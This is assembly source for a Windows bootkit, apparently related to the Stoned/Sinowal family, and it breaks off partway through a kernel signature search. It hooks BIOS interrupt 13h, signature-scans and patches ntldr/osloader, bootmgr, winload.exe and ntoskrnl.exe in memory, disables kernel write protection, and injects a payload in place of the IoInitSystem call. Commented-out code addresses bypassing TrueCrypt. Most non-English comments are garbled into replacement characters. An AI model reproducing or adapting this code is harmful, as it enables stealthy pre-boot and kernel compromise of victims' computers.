l_orig_int_13h:
jmp 0000h:0000h ; ������� ���������� ����������� ����������� ���������� 13h.
nop
; ���� ������� ��������� ������� ������ (02h � 042h) ���������� 13h.
l_int_13h_hook:                                                              ; encrypted sectors will be read/written here
jmp l_int_13h_hook_start
dd 74B0D47Fh
l_int_13h_hook_start:

;; TrueCrypt called us? (this jumps then back to TrueCrypt if it is active)
;call TrueCrypt_Complex_BIOS_Forward
;
;; install the double forward to TrueCrypt (only if TrueCrypt becomes active)
;call Install_TrueCrypt_Hook
;
;Interrupt_13h_Hook_Stage_2:                                                     ; decrypted sectors will be read/written here

; ������ ������ "Extended Read" � "Read" ������� 13h ����������.
cmp ah, 42h ; ����������� ������?
je l_handle_int_13h
cmp ah, 02h ; ������� ������?
jne l_orig_int_13h

l_handle_int_13h:

; ��������� ��������, � ������� ���������� ��������� ��� ������ (ah = 02h).
push ax                                                                         
push cx

pushf ; ��������� ��������� ������ int 13h. ��������� � ���� �����.
push cs ; ��������� � ���� ������� ��������.
call word l_orig_int_13h ; �������� ������������ ���������� (�������� call ����� � ���� �������� ��������).

; ��������������� ��������.
pop cx
pop ax

jc l_exit_hook_int_13h ; ���� �������� ������ ��� ������, ���������� ���������� ���������� ���������.

; ��������� ����� � ��������.
pushf
pushad

; ������� ds ����� ����� �������������� � �������� ������� � ����� ������.
push ds                                                                         
push es

mov di, bx ; � di ����� �������� �� ������ �� ���������� �������.
mov cl, al
cmp ah, 02h ; ������� ������.
je l_normalized_params
mov cl, [si + 2] ; ��������� �� ������ ��������� ������ ����� ��������.
les di, [si + 4] ; ��������� �� ������ ��������� �������� �� ������ �� ���������� �������.
l_normalized_params:
shl cx, 9 ; � cx ���������� ������ ��������� ������.
cld
xor bx, bx
push cs
pop ds

; ��������� ���������.

; ��������� ���������� �� � ��� ��� �� bootmgr.
test [hooker_flags], byte 00001000b
jnz l_ntldr_already_hooked
pusha                                                                           ; store registers (contain int 13h input values)

; ��������� ���������� � ������ ������ ntldr � ������� �������� ����������� (XP, Server 2003 (2x times)).
; E8 39 0C       call    sub_28C8      -> 90 90 90
; 83 C4 02       add     sp, 2         -> 83 C4 02
; E9 00 00       jmp     $+3           -> E9 00 00
;loc_1C95:
; E9 FD FF       jmp     loc_1C95      -> E9 00 00
l_search_signature_1:
mov    al, 0x83
repne  scasb
jnz    l_end_signature_1 ; ��������� � ��������� ���������.
cmp    dword [es:di], 00E902C4h
jnz    l_search_signature_1
cmp    dword [es:di + 4], 0FFFDE900h
jnz    l_search_signature_1
mov    dword [es:di - 4], 83909090h ; �������� call.
mov    word [es:di + 6], 0 ; ������������ jmp.
or     byte [hooker_flags], 00000001b ; ��������� ntldr �������.
jmp    short l_search_signature_1

l_end_signature_1:
popa
pusha

; ���� ��������� ������ osloader.exe.
;   + 8B F0 85 F6 74 21/22 80 3D
;     Windows XP.OSLOADER +26B9Fh
; if found, remove int 13h hook and thats it
;   0004b502: mov esi, eax                    ; 8bf0
;   0004b504: test esi, esi                   ; 85f6
;   0004b506: jz .+0x00000021                 ; 7421
;   0004b508: cmp byte ptr ds:0x442284, 0x00  ; 803d8422440000
l_search_signature_2:
mov al, 0x8B
repne scasb
jnz l_end_signature_2 ; ���� ������ �� �����, �� ��������� � ������ nt6-��������.
cmp dword [es:di], 0x74F685F0
jnz l_search_signature_2
cmp word [es:di + 5], 0x3D80
jnz l_search_signature_2
mov ah, [es:di + 4]
cmp ah, 0x21                                                                     ; 21h or 22h are accepted for signature
jz l_found_signature_2
cmp ah, 0x22
jnz l_search_signature_2                                                        ; otherwise continue search

l_found_signature_2:
; ������ osloader.exe.
;   + FF 15 FC F5 09 00
;     00046b9f:   mov esi, eax                      ->    call [0009F5FCh]
;     00046ba1    test esi, esi                     ->    
;     00046ba3    jz .+0x00000021                   ->    
;     00046ba5:   cmp byte ptr ds:0x43aef8, 0x00    ->    cmp byte ptr ds:0x43aef8, 0x00
;     00046bac:   jz .+0x00000007                   ->    jz .+0x00000007
dec di                                                                          ; -1 to get offset of signature
mov eax, [es:di]                                                                ; backup
mov [global_data + 0], eax
mov ax, [es:di + 4]                                                             ; 6 bytes of code
mov [global_data + 4], ax
mov ax, 0x15FF                                                                   ; the opcode which jumps to the pointer (call instruction)
stosw
mov eax, cs
shl eax, 4                                                                      ; eax = linear address of this segment
add [calling_address], eax                                                      ; offset + base address
add eax, calling_address                                                        ; will be address to jump to
stosd                                                                           ; store address

popa
jmp short l_unhook_int13h                                                       ; remove the hook and exit

l_end_signature_2:
popa

l_ntldr_already_hooked:
test byte [hooker_flags], 00000001b                                             ; verify signature 1 found
jnz l_restore_and_exit_int_13h                                                  ; if not => do not operate any further, exit

; ��������� ���������� � ������ ������ bootmgr.
; 66 52      push    edx
; 66 55      push    ebp
; 66 33 ED   xor     ebp, ebp
; 66 6A 20   push    large 20h ; ' '
; 66 53      push    ebx
; 66 CB      retfd
Search_Signature_3:
mov al, 0x66
repne scasb
jnz l_restore_and_exit_int_13h                                                     ; if not found => exit
cmp byte [es:di], 0x52
jnz Search_Signature_3
cmp dword [es:di + 2], 0xED336655
jnz Search_Signature_3
cmp dword [es:di + 6], 0x66206A66
jnz Search_Signature_3
cmp word [es:di + 10], 0x6653
jnz Search_Signature_3

; ������������� ��� � bootmgr.
; ��������� �������� ����� ������� ��� bootmgr.exe
xor eax, eax
mov ax, cs
shl eax, 4
add eax, bootmgr_patcher

; ������ ����������, ������� ��������� ����� ����.
mov [bootmgr_hook_data_start + 2], eax

; ������������� ���.
dec di
mov si, bootmgr_hook_data_start
mov cx, bootmgr_hook_data_end - bootmgr_hook_data_start
rep movsb
or byte [hooker_flags], 00001000b
jmp short l_restore_and_exit_int_13h

l_unhook_int13h:
; ��������������� ������������ ����������.
mov eax, [l_orig_int_13h + 1]
mov ds, bx ; ds = 0
mov [13h * 4], eax

l_restore_and_exit_int_13h:
; ��������������� ��� ����� ���������� ��������.
pop es
pop ds
popad
popf
; � ah ����� ��� �������� = 00h - �������� ����������.
mov ah, 0

l_exit_hook_int_13h:
; ��������� iret ���������� (������ ������ ��������� ��� � �����).
retf 2

; ��� ��� bootmgr
bootmgr_hook_data_start:
mov ebx, 0
db 0x90
bootmgr_hook_data_end:


; this here is Configuration Data
;   bit 0:  found Signature 1
;   bit 3:  disable ntldr signature check  (when signature have been already found)
hooker_flags db 00000000b
; linear address of Windows XP entry point
calling_address dd winxp_x32_entry_point

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Install_TrueCrypt_Hook:
;
;; check if TrueCrypt is installed and modify hook =)
;push ds
;push eax
;xor ax,ax
;mov ds,ax
;cmp [13h * 4],word l_int_13h_hook
;je NoTrueCrypt_Detected
;
;; Windows request -> modified by Stoned Bootkit -> TrueCrypt Encryption -> (double forward here) -> Interrupt 13h
;mov eax,dword [13h * 4]                                                        ; IVT interrupt 13h vector contains TrueCrypt
;xchg dword [cs:l_orig_int_13h + 1],dword eax                    ; so set as forward; eax contains then the original BIOS interrupt 13h handler
;
;; set forwarded for reading/writing encrypted sectors
;mov [cs:TrueCrypt_Complex_BIOS_Forward + 0],dword 0EA02C483h                   ; opcodes
;mov [cs:TrueCrypt_Complex_BIOS_Forward + 4],dword eax                          ; and address
;
;; hook interrupt 13h - again :-)
;mov [13h * 4],word Interrupt_13h_Hook_Stage_2                                  ; new address to jump to on "int 13h" instruction :-)
;mov [13h * 4 + 2],cs                                                           ; set segment to jump to on int 13h
;
;; handle the call without quering the call to TrueCrypt again :)
;pop eax
;pop ds
;jmp TrueCrypt_Complex_BIOS_Forward
;
;NoTrueCrypt_Detected:
;pop eax
;pop ds
;
;ret
;
;
;TrueCrypt_Complex_BIOS_Forward:
;
;nop   ; 83C402              add sp,2                removing the function call
;nop   
;nop   
;nop   ; EA00000000          jmp word 0000h:0000h    jumping to the BIOS
;nop   
;nop   
;nop   
;nop   
;
;ret
;
;;;;;;;;;;;;;;;;;;;;;;;;;;

use32
; ������ ��� ���������� �� 32-������� ���� osloader.exe ��� bootmgr.exe:
; Windows XP functions:
;    - winxp_x32_entry_point

; Windows Vista/7 functions:
;    - winvista_x32_entry_point
;    - Hook_WinloadExe
;    - Windows_Vista_NtKernel_Hook_Code

; OS independent functions:
;    - Find_Ntoskrnl_Code_Pattern
;    - Ntoskrnl_Hook_Code
;    - Patch_Kernel_Code
;    - temp_data_x32
;    - Obfuscation_Function
;    - Obfuscation_Return

align 8
winxp_x32_entry_point:
sub    [esp], dword 6 ; ������ ����� �������� �� 6 ���� ����� (�� ������ ��������� ����������).

pushad ; +32 � ����
pushfd ; +4 � ����
cld

; ���������� ��� ��������� ������ (WP bit 16).
mov    eax, cr0
push   eax ; +4 � ����
and    eax, 0xFFFEFFFF ; clear cr0.WP (bit 16), it is normally set in Windows
mov    cr0, eax

mov    edi, [esp + 40] ; edi = ����� �������� � osloader.exe
call   l_curr_eip_0
l_curr_eip_0:
pop    esi
add    esi, global_data - l_curr_eip_0 ; esi = ���������� ����� global_data.

; ��������������� ������������ �����.
mov    ecx, 6
rep    movsb

; scan OS Loader for the signature (we need to copy some system values from runtime ntldr)    [same as in previous Sinowal version]
;   + C7 46 34 00 40  ...   A1
;     ntldr.19A44h          ntldr.19A51h
;			memory.0x00415915     memory.0x00415921
and    edi, 0xFFF00000 ; ����������� �� ������� ���������. ������� ����� osloader.exe = 0x00400000.
mov    al, 0xC7
Search_Ntldr_Signature:
scasb
jnz    Search_Ntldr_Signature
cmp    dword [edi], 0x40003446
jnz    Search_Ntldr_Signature
Search_Ntldr_Signature_2:
mov    al, 0xA1 ; start scanning for second signature
scasb
jnz    Search_Ntldr_Signature_2

;00000000 _LDR_DATA_TABLE_ENTRY struc ; (sizeof=0x50)
;00000000 InLoadOrderLinks _LIST_ENTRY ?
;00000008 InMemoryOrderLinks _LIST_ENTRY ?
;00000010 InInitializationOrderLinks _LIST_ENTRY ?
;00000018 DllBase         dd ?                    ; offset
;0000001C EntryPoint      dd ?                    ; offset
;00000020 SizeOfImage     dd ?
;00000024 FullDllName     _UNICODE_STRING ?
;0000002C BaseDllName     _UNICODE_STRING ?
;00000034 Flags           dd ?
;00000038 LoadCount       dw ?
;0000003A TlsIndex        dw ?
;0000003C ___u11          $38C929518E851D0CE0829DAFE6F96695 ?
;00000044 ___u12          $07E50B91B6BB7B4A220DB818F2334DE2 ?
;00000048 EntryPointActivationContext dd ?        ; offset
;0000004C PatchInformation dd ?                   ; offset
;00000050 _LDR_DATA_TABLE_ENTRY ends

; get Ntoskrnl Image Address
mov    eax, [edi]                                                                  ; � eax ��������� ��������� �� ��������� ��������� _LDR_DATA_TABLE_ENTRY (0x004682c4 (SP2) ��� 0x004682e4 (SP3)).
mov    eax, [eax]                                                                  ; � eax - ��������� �� _LDR_DATA_TABLE_ENTRY.
mov    eax, [eax]                                                                  ; � eax - ����� ��������� _LDR_DATA_TABLE_ENTRY ([80087000] = 0x8008a090 (some system memory table)).
mov    edi, [eax + 0x18]                                                           ; � edi - ���� ntoskrnl.
mov    ecx, [edi + 0x3c]                                                           ; PE Header (skip DOS Header/Stub)
mov    ecx, [ecx + edi + 0x50]                                                     ; � ecx - ������ ������ ���� � ������ (SizeOfImage).
call   dword find_ntoskrnl_x32_sig
cmp    ebx, 0
je     winxp_x32_entry_point_exit ; not found? -> exit

sub    esi, 6

; � ��������� XP/2003-������� ntoskrnl.exe ������������ ����� ��������� ������������ ������ (������ 128 ����). � ������ ������ ������������ ������� - ��� ������������ ����� ����� �� �������, 
; � �������, ��� ��� ������� �������� 512 ����. � ������ �� ����, ������������ ������ ����� 0x1000, �� ��� � ������ � NT6 ���������, ����� ������ ����� � ����������� �������.

; ��������� ������ ������������ � ������.
mov    eax, [edi + 0x3C] ; eax = IMAGE_NT_HEADERS
add    eax, edi
mov    eax, [eax + 0x38] ; eax = Section Alignment
cmp    eax, 0x1000
jne    small_align
call   prepare_payload_and_patch_nt6_oskrnl_x32
jmp    winxp_x32_entry_point_exit

small_align:
add    edi, ecx ; edi = ������ ���� ����� �� ������� ntoskrnl.exe.
call   prepare_payload_and_patch_ntoskrnl_x32

winxp_x32_entry_point_exit:
pop    eax
mov    cr0, eax

popfd
popad
ret ; ������� ���������� ������������ 6 ������, ������� �� ����� ��������.

align 16
prepare_payload_and_patch_nt6_oskrnl_x32:
; ����:
;      ebx = �����, ��� ����� ������������� ����� ������� IoInitSystem. 
;      edi = ���� ntoskrnl.
;      ecx = ������ ������ ntoskrnl.
;      esi = ���������� ����� global_data.

; ���� ������ �� ��������� ������ � ����� ��� ������ ������� � �������� �������� ����������.
mov    eax, edi
add    edi, [edi + 0x3C] ; ���������� ���������
movzx  ecx, word [edi + 6] ; ecx = ���������� ������.
add    edi, 248 ; rdi = ���������� ����� ������� ��������� ������.

x32_section_iter_loop:
mov    edx, dword [edi + 16]
cmp    edx, 0 ; SizeOfRawData = 0?
je     x32_section_iter_next
test   dword [edi + 36], 0x00000020 ; �������� �� ������ ���? (#define IMAGE_SCN_CNT_CODE 0x00000020  // Section contains code.)
jz     x32_section_iter_next
test   dword [edi + 12], 0x00000FFF ; 4 KB alignment of section?
jnz    x32_section_iter_next ; if not we can't use it
test   edx, 0x00000FFF ; ���� ����, ������ ������ ��������� �� 4��, ��� ����� �� ��������!
jz     x32_section_iter_next
not    edx
and    edx, 0x00000FFF
cmp    edx, payload_x64 - payload_x32 + global_data_end - disk_drive_name
jge    x32_section_found ; ���� ������ ��� ����� ������� x64-�������.
;test   dword [edi + 16], 0x000001FF ; 1 KB, 111111111, ���� ����, �� ������ ��� ���� ��������� 512 ����!
;jz     x32_section_found
x32_section_iter_next:
add    edi, 40 ; + sizeof(IMAGE_SECTION_HEADER)
loop   x32_section_iter_loop
jmp    prepare_payload_and_patch_nt6_oskrnl_x32_exit ; �� ������� ����� ��������� 512 ����.

x32_section_found:
add    eax, [edi + 12] ; + VirtualAddress, eax = ������ ��������� ������ (VirtualAddress).
add    eax, [edi + 16] ; + RawSize, eax = ������ ���� ����� �� �������.
mov    edi, eax

; �������� ��� ������ � ������ ntoskrnl.
prepare_payload_and_patch_ntoskrnl_x32:
mov    edx, [ebx] ; edx = ������������� ����� ������� IoInitSystem.
lea    edx, [ebx + edx + 4] ; edx = ���������� ����� ������� IoInitSystem.
add    esi, payload_x64 - global_data - 4 ; esi = ���������� ����� temp_data_x32 � payload_x32
mov    [esi], edx ; ���������, ����� � ���������� ������� ���������� �� IoInitSystem.
sub    esi, payload_x64 - payload_x32 - 4 ; esi = ���������� ����� payload_x32.
mov    ecx, payload_x64 - payload_x32 ; ������ x32-�������.
; �������� ��� ������ � ����� ������ �� ������� ����������.
push   edi
rep    movsb
; �������� ������ � ��������� ����� ����� �� �� ������ �������.
mov    ecx, global_data_end - disk_drive_name ; ������ ������ � ��������� �����.
sub    esi, payload_x64 - disk_drive_name; esi = ���������� ����� ������ � ��������� �����.
rep    movsb
pop    edi

; ����������� ������������� ����� �� ������ ������� � ���������� call, ������ IoInitSystem.
sub    edi, ebx ; - ����� ������� (� XP ~ IoInitSystem).
sub    edi, 4 ; -4 ����� � ���� ����, ��� ���������� call �������� ������������� �����.
mov    [ebx], edi ; ��������� ����� IoInitSystem �� ����� ������ x32-�������.

prepare_payload_and_patch_nt6_oskrnl_x32_exit:
ret


; ��� ��� ��������� ���� � bootmgr.exe.
align 8
bootmgr_patcher:
pushad

; ��������� bootmgr.exe.
mov    edi, 0x00400000 ; ���� bootmgr.exe (x32/x64)
mov    ecx, 1024 * 1024 ; �������, ��� ������������ bootmgr.exe ����� 1��.

call   l_curr_eip_1
l_curr_eip_1:
pop    esi
sub    esi, l_curr_eip_1

; Input
;   esi = address of temp_data_x32
;   edi = address of memory to scan (���� winload/winresume.exe)
;   ecx = bytes to scan

; ���� ��������� � bootmgr.exe (������� Archx86TransferTo32BitApplicationAsm):
; 55                push    ebp
; 56                push    esi
; 57                push    edi
; 53                push    ebx
; 06                push    es
; 1E                push    ds
; 8B DC             mov     ebx, esp
push   edi
push   ecx
mov    al, 0x55
l_search_bootmgr32_sig_loop:
repne  scasb
jecxz  l_search_bootmgr64_sig ; ��������� � ������ ��������� ��� x64.
cmp    dword [edi], 0x06535756
jne    l_search_bootmgr32_sig_loop
cmp    dword [edi + 4], 0x0FDC8B1E
jne    l_search_bootmgr32_sig_loop

call   set_winload_x32_patcher

; ���� ��������� � bootmgr.exe (������� Archx86TransferTo64BitApplicationAsm):
l_search_bootmgr64_sig:
pop    ecx
pop    edi
mov    al, 0x55

l_search_bootmgr64_sig_loop:
repne  scasb
jecxz  bootmgr_x32_patcher_exit ; ��������� ������ �������, �. �. �� ������� ����� ������ ���������.
cmp    dword [edi], 0x06535756
jne    l_search_bootmgr64_sig_loop
cmp    dword [edi + 4], 0xC0200F1E
jne    l_search_bootmgr64_sig_loop
cmp    dword [edi + 8], 0xD8200F50
jne    l_search_bootmgr64_sig_loop

call   set_winload_x32_patcher

bootmgr_x32_patcher_exit:
popad

; ����������� ����� ����, �� ������������� �������.
push   edx
push   ebp
xor    ebp, ebp

mov    ebx, 0x401000
push   ebx
ret ; ������� ���������� �� ����� ����� � bootmgr.exe.

align 8
set_winload_x32_patcher:
dec    edi ; �������� �� ���� ���� ����� �� �� ����������� ������ ������� scasb.
mov    al, 0xE8
stosb
lea    eax, [esi + winload_patcher]
sub    eax, edi
sub    eax, 4
stosd
ret

; ��� ��� ��������� ���� � winload.exe.
align 16
winload_patcher:
push   ecx
push   esi
push   edi

call   l_curr_eip_2
l_curr_eip_2:
pop    esi
sub    esi, l_curr_eip_2

; ��������� ���������� ��������� � ������ �� ������.
mov	   eax, cr0	
push   eax
and	   eax, 0x7FFEFFFF
mov	   cr0, eax

; ��������� ���� winload.exe
; ����� ������ �������� ����������� �������, ��� ���� ����� �� ����� ������� ��� �����:
; - Archx86TransferTo32BitApplicationAsm ���
; - Archx86TransferTo64BitApplicationAsm
; ��� ����� ��� ���� ����� ��������� �������������� ����� �� �������.

; ����� ��������� � Archx86TransferTo32BitApplicationAsm (������ �� Windows 7):
; 50                   push    eax
; A1 A4 1B 49 00       mov     eax, ds:491BA4h
; FF D0                call    eax ; dword_491EA4
; 5B                   pop     ebx
mov    edi, [esp + 16] ; ��������� ����� ��������.
mov    ecx, 512
mov    al, 0xFF
winload_patcher_x32_sig_loop:
repne  scasb
cmp    ecx, 0
jz    l_search_winload_x64_base
cmp    dword [edi], 0xE38B5BD0
jne    winload_patcher_x32_sig_loop
cmp    word [edi - 7], 0xA150
jne    winload_patcher_x32_sig_loop

mov    edi, [edi - 5]
call   search_winload_pe_base
cmp    ecx, 0
je     l_search_winload_x64_base

cmp    word [ecx + 0x18], 0x010B ; Magic
jne    l_search_winload_x64_base
mov    ecx, [ecx + 0x50] ; ecx = SizeofImage

; ���� ��������� � winload.exe (������� OslArchTransferToKernel).
; 8B 44 24 08       mov     eax, [esp+arg_0]
; 33 D2             xor     edx, edx
; 51                push    ecx
; 52                push    edx
; 6A 08             push    8
; 50                push    eax
; CB                retf
mov    al, 0x8B
l_search_winload_x32_sig:
repne  scasb
jecxz  l_search_winload_x64_base
cmp    dword [edi], 0x33082444
jne    l_search_winload_x32_sig
cmp    dword [edi + 4], 0x6A5251D2
jne    l_search_winload_x32_sig
cmp    word [edi + 8], 0x5008
jne    l_search_winload_x32_sig

; ������������� ��� (jmp �� �������������� ��������) � ����� ����� �������.
add    edi, 6
mov    al, 0xE9
stosb
lea    eax, [esi + nt6_kernel_x32_patcher]
sub    eax, edi
sub    eax, 4
stosd
jmp    winload_patcher_exit

; ����� ��������� � Archx86TransferTo64BitApplicationAsm (������ �� Windows 7):
; 48                      dec     eax
; 8B 86 90 CE 47 00       mov     eax, [esi + _BootApp64EntryRoutine] ; (esi = 0)
; 48                      dec     eax
; FF D0                   call    eax
; 48                      dec     eax
; 8B E3                   mov     esp, ebx
; 2B C0                   sub     eax, eax
; B8 0B 0B 45 00          mov     eax, offset loc_450B0B
l_search_winload_x64_base:
mov    edi, [esp + 16] ; ��������� ����� ��������.
mov    ecx, 512
mov    al, 0x48
l_search_winload_x64_base_loop:
repne  scasb
jecxz  winload_patcher_exit
cmp    dword [edi], 0x8B48D0FF
jne    l_search_winload_x64_base_loop
cmp    dword [edi + 4], 0xB8C02BE3
jne    l_search_winload_x64_base_loop
cmp    word [edi - 7], 0x868B
jne    l_search_winload_x64_base_loop

mov    edi, [edi - 5]
call   search_winload_pe_base
cmp    ecx, 0
je     winload_patcher_exit

cmp    word [ecx + 0x18], 0x020B ; Magic
jne    winload_patcher_exit
mov    ecx, [ecx + 0x50] ; ecx = SizeofImage

; ���� ��������� � winload.exe (������� OslArchTransferToKernel).
; 49 8B CC       mov     rcx, r12
; 56             push    rsi
; 6A 10          push    10h
; 41 55          push    r13
; 48 CB          retfq
;;mov    al, 0x49
;;l_search_winload_x64_sig:
;;repne  scasb
;;jecxz  winload_patcher_exit
;;cmp    dword [edi], 0x6A56CC8B
;;jne    l_search_winload_x64_sig
;;cmp    dword [edi + 4], 0x48554110
;;jne    l_search_winload_x64_sig
;;cmp    byte [edi + 8], 0xCB
;;jne    l_search_winload_x64_sig
;;
;;; ������������� ��� (jmp �� �������������� ��������) � ����� ����� �������.
;;add    edi, 3
;;mov    al, 0xE9
;;stosb
;;lea    eax, [esi + nt6_kernel_x64_patcher]
;;sub    eax, edi
;;sub    eax, 4
;;stosd

; 48 33 F6       xor     rsi, rsi
; 4C 8B E1       mov     r12, rcx
; 4C 8B EA       mov     r13, rdx
; 48 2B C0       sub     rax, rax ; ������ ��� ������ � Windows 7.
; 66 8E D0       mov     ss, ax
mov al, 0x48
l_search_winload_x64_sig:
repne  scasb
jecxz  winload_patcher_exit
cmp    dword [edi], 0x8B4CF633
jne    l_search_winload_x64_sig
cmp    dword [edi + 4], 0xEA8B4CE1
jne    l_search_winload_x64_sig
;cmp    dword [edi + 8], 0x66c02b48 ; � Vista ��� ����� ���������.
;jne    l_search_winload_x64_sig

dec    edi
mov    al, 0xE9
stosb
lea    eax, [esi + nt6_kernel_x64_patcher]
sub    eax, edi
sub    eax, 4
stosd

inc    edi
mov    eax, edi
;lea eax, [esi + nt6_kernel_x64_patcher_ret_addr]
sub    eax, esi
sub    eax, 4 + nt6_kernel_x64_patcher_ret_addr
mov    [esi + nt6_kernel_x64_patcher_ret_addr], eax



winload_patcher_exit:
; ��������������� CR0.
pop    eax
mov    cr0, eax
pop    edi
pop    esi
pop    ecx
pop    eax ; ��������� ����� ��������.
; ����������� ����� ����, �� ������������� �������.
push   ebp
push   esi
push   edi
push   ebx
push   es
jmp    eax ; ������� ���������� ������������� �������.

align 8
search_winload_pe_base:
; ����:
;      edi - ��������, ��� ����� ����� ������ ������� ����� ����� � winload.
; �����:
;      edi - ���� winload.exe
;      ecx - ����� IMAGE_NT_HEADERS
mov    edi, [edi] ; edi = ����� ����� ����� � winload.exe.
test   edi, edi ; ��� 32-������� winload.exe ������.
jz     search_winload_pe_base_exit 
cmp    edi, 0x00100000 ; ���� ������ ���� 2 ���������, ���� ���� �� �����.
jb     search_winload_pe_base_exit
mov    eax, 0x00905A4D ; ��������� PE-����
mov    ecx, 0x00124000 ; ������������ ������ ����������� ������.
std ; �������� �����.

l_search_winload_pe_base_loop:
repne  scasb
jecxz  search_winload_pe_base_exit
cmp    [edi + 1], eax
jne    l_search_winload_pe_base_loop

inc    edi ; edi  = ���� winload.exe.
mov    ecx, [edi + 0x3C]
add    ecx, edi ; ecx = ����� IMAGE_NT_HEADERS.
search_winload_pe_base_exit:
cld ; ������ �����.
ret

; ��� ��� ��������� ���� � ntoskrnl.exe.
align 16
nt6_kernel_x32_patcher:
; ���� ���� ntoskrnl.
pushad
mov     edi, eax ; � eax � ��� ����� ����� �������.
mov     eax, 0x00905A4D ; ��������� PE-����
mov     ecx, 0x005DD000 ; ������������ ������ ����������� ������.
std ; �������� �����.
l_nt6_kernel_x32_base_srch:
repne  scasb
jecxz  nt6_kernel_x32_patcher_exit
cmp    [edi + 1], eax
jne    l_nt6_kernel_x32_base_srch

cld ; ������ �����.

inc    edi ; edi  = ���� ntoskrnl.exe.
mov    ecx, [edi + 0x3C]
add    ecx, edi ; ecx = ����� IMAGE_NT_HEADERS.
cmp    word [ecx + 0x18], 0x010B ; Magic
jne    nt6_kernel_x32_patcher_exit
mov    ecx, [ecx + 0x50] ; ecx = SizeofImage

call   l_curr_eip_3
l_curr_eip_3:
pop    esi
add    esi, global_data - l_curr_eip_3

; ���� ��������� � ntoskrnl � ������������� ���.
call   find_ntoskrnl_x32_sig
cmp    ebx, 0
je     nt6_kernel_x32_patcher_exit
call   prepare_payload_and_patch_nt6_oskrnl_x32 ; ������������� ���!

nt6_kernel_x32_patcher_exit:
cld ; ������ �����.
popad

; ����������� ����� ����, �� ������������� �������.
push    edx
push    8
push    eax
retf ; ����� ���������� ��������� ntoskrnl.exe

use64
align 16
nt6_kernel_x64_patcher:
push   rax
push   rdi
push   rsi
push   rcx
push   rdx

; ���� ���� ntoskrnl.
xor    rcx, rcx
mov    rdi, rdx ; � rdx � ��� ����� ����� �������.
mov    eax, 0x00905A4D ; ��������� PE-����
mov    ecx, 0x00700000 ; ������������ ������ ����������� ������.
std ; �������� �����.
l_nt6_kernel_x64_base_srch:
repne  scasb
jnz    nt6_kernel_x64_patcher_exit
cmp    [rdi + 1], eax
jne    l_nt6_kernel_x64_base_srch

cld ; ������ �����.

inc    rdi ; edi  = ���� ntoskrnl.exe.
mov    ecx, [rdi + 0x3C]
add    rcx, rdi ; rcx = ����� IMAGE_NT_HEADERS.
cmp    word [rcx + 0x18], 0x020B ; Magic
jne    nt6_kernel_x64_patcher_exit

mov    eax, [rcx + 0x50] ; eax = SizeofImage
xor    rcx, rcx
mov    ecx, eax

call   l_curr_eip_4
l_curr_eip_4:
pop    rsi
add    rsi, global_data - l_curr_eip_4

; ���� ��������� � ntoskrnl � ���������� ����� ��������� ������, ������� ����� �������� �� ����.
call   find_ntoskrnl_x64_sig
cmp    rbx, 0
je     nt6_kernel_x64_patcher_exit

mov    rax, cr0
push   rax
and    eax, 0xFFFEFFFF ; clear cr0.WP (bit 16), it is normally set in Windows
mov    cr0, rax

; ���� ������ �� ��������� ������ � ����� ��� ������ ������� � �������� �������� ����������.
mov    rax, rdi
mov    ecx, [rdi + 0x3C]
add    rdi, rcx ; ���������� ���������
movzx  ecx, word [rdi + 6] ; ecx = ���������� ������.
add    rdi, 264 ; rdi = ���������� ����� ������� ��������� ������.

Section_Table_Entry:
mov    edx, [rdi + 16]
cmp    edx, 0 ; SizeOfRawData = 0?
je     Section_Table_Entry_Next
test   dword [rdi + 36], 0x00000020 ; �������� �� ������ ���? (#define IMAGE_SCN_CNT_CODE 0x00000020  // Section contains code.)
jz     Section_Table_Entry_Next
test   dword [rdi + 12], 0x00000FFF ; ������ ������ ��������� �� ������� ��������?
jnz    Section_Table_Entry_Next ; ���� ���, �� ��� ����� ������ �� ��������.
test   edx, 0x00000FFF ; ���� ����, ������ ������ ��������� �� 4��, ��� ����� �� ��������!
jz     Section_Table_Entry_Next
not    edx
and    edx, 0x00000FFF
cmp    edx, payload_x64_end - payload_x64 + global_data_end - disk_drive_name
jge    Section_Table_Entry_Found ; ���� ������ ��� ����� ������� x64-�������.
Section_Table_Entry_Next:
add    rdi, 40 ; + sizeof(IMAdGE_SECTION_HEADER)
loop   Section_Table_Entry
jmp    prepare_payload_and_patch_nt6_oskrnl_x64_exit ; �� ������� ����� ��������� 512 ����.

Section_Table_Entry_Found:
mov    ecx, [rdi + 12]
add    rax, rcx ; rax = ������ ��������� ������ (VirtualAddress).
mov    ecx, [rdi + 16]
add    rax, rcx ; rax = ������ ���� ����� �� �������.
mov    rdi, rax

; �������� ��� ������ � ������ ntoskrnl.
movsxd rdx, dword [rbx] ; edx = ������������� ����� ������� IoInitSystem.
lea    rdx, [rbx + rdx + 4]
add    rsi, payload_x64_end - global_data - 8 ; esi = ���������� ����� temp_data_x64 � payload_x64
mov    [rsi], rdx ; ���������, ����� � ���������� ������� ���������� �� IoInitSystem.
sub    rsi, payload_x64_end - payload_x64 - 8 ; esi = ���������� ����� payload_x64.
mov    ecx, payload_x64_end - payload_x64 ; ������ x64-�������.
; �������� ��� ������ � ����� ������ �� ������� ����������.
push   rdi
rep    movsb
; �������� ������ � ��������� ����� ����� �� �� ������ �������.
mov    ecx, global_data_end - disk_drive_name ; ������ ������ � ��������� �����.
sub    rsi, payload_x64_end - disk_drive_name; esi = ���������� ����� ������ � ��������� �����.
rep    movsb
pop    rdi

; ����������� ������������� ����� �� ������ ������� � ���������� call, ������ IoInitSystem.
sub    rdi, rbx ; - ����� ������� (� XP ~ IoInitSystem).
sub    rdi, 4 ; -4 ����� � ���� ����, ��� ���������� call �������� ������������� �����.
mov    [rbx], edi ; ��������� ����� IoInitSystem �� ����� ������ x32-�������.

prepare_payload_and_patch_nt6_oskrnl_x64_exit:
pop    rax
mov    cr0, rax

nt6_kernel_x64_patcher_exit:
cld
pop    rdx
pop    rcx
pop    rsi
pop    rdi
pop    rax

; ����������� ����� ����, �� ������������� �������.
xor rsi, rsi
mov r12, rcx

; ������� ���������� ������������� �������.
db 0xe9 ; jmp dword orig_func
nt6_kernel_x64_patcher_ret_addr:
dd 0x00000000



use32
align 16
find_ntoskrnl_x32_sig:
; ����:
;   ecx = SizeOfImage
;   edi = Image base
; �����: ebx = ����� ������ E8 ������ ntoskrnl.exe (����� IoInitSystem).

push   ecx
push   edi

; ���� ��������� � ntoskrnl.exe (������� Phase1InitializationDiscard):
; 6A 19                push    19h
; 6A 4B                push    4Bh
; 58                   pop     eax
; E8 CE F9 C5 FF       call    _InbvSetProgressBarSubset@8 ; InbvSetProgressBarSubset(x,x)
